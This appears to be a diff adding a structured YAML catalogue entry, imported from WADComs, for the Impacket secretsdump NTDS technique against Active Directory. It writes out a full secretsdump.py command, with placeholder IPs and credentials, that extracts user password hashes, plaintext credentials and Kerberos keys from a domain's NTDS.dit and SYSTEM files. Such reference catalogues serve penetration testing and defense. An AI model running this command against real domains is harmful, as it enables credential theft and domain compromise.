@@ -1,0 +1,86 @@
+id: wadcoms/Impacket-SecretsDump-NTDS
+type: technique
+platform: active-directory
+name: Impacket SecretsDump NTDS
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- a valid password
+- a valid username
+commands:
+- template: python3 secretsdump.py -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system
+    -dc-ip 10.10.10.1 test.local/john:password123@10.10.10.2
+  comment: "Impacket's secretsdump.py will perform various techniques to dump secrets from the remote\
+    \ machine without executing any agent. Techniques include reading SAM and LSA secrets from registries,\
+    \ dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit. The following\
+    \ command will attempt to use the specified machines NTDS.dit and system file to extract the user\
+    \ account hashes associated with that machine.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.2\n\n\
+    \tDomain Controller: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n"
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
+- https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy
+tags:
+- active-directory
+- wadcoms
+- kerberos
+- ntlm
+source_data:
+  WADComs:
+    raw:
+      file: Impacket-SecretsDump-NTDS.md
+      document: "---\ndescription: |\n  Impacket's secretsdump.py will perform various techniques to dump\
+        \ secrets from the remote machine without executing any agent. Techniques include reading SAM\
+        \ and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys,\
+        \ and dumping NTDS.dit. The following command will attempt to use the specified machines NTDS.dit\
+        \ and system file to extract the user account hashes associated with that machine.\n\n  Command\
+        \ Reference:\n\n  \tTarget IP: 10.10.10.2\n\n  \tDomain Controller: 10.10.10.1\n\n  \tDomain:\
+        \ test.local\n\n  \tUsername: john\n\n  \tPassword: password123\n\ncommand: |\n  python3 secretsdump.py\
+        \ -ntds C:\\Windows\\NTDS\\ntds.dit -system C:\\Windows\\System32\\Config\\system -dc-ip 10.10.10.1\
+        \ test.local/john:password123@10.10.10.2\nitems:\n  - Password\n  - Username\nservices:\n  - Kerberos\n\
+        \  - NTLM\nOS:\n  - Linux\n  - Windows\nattack_types:\n  - Exploitation\nreferences:\n  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py\n\
+        \  - https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy\n---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:c606ba6812805f53dda51179cd9083eed10e7d766530b9f764eaffdb8a15ca75
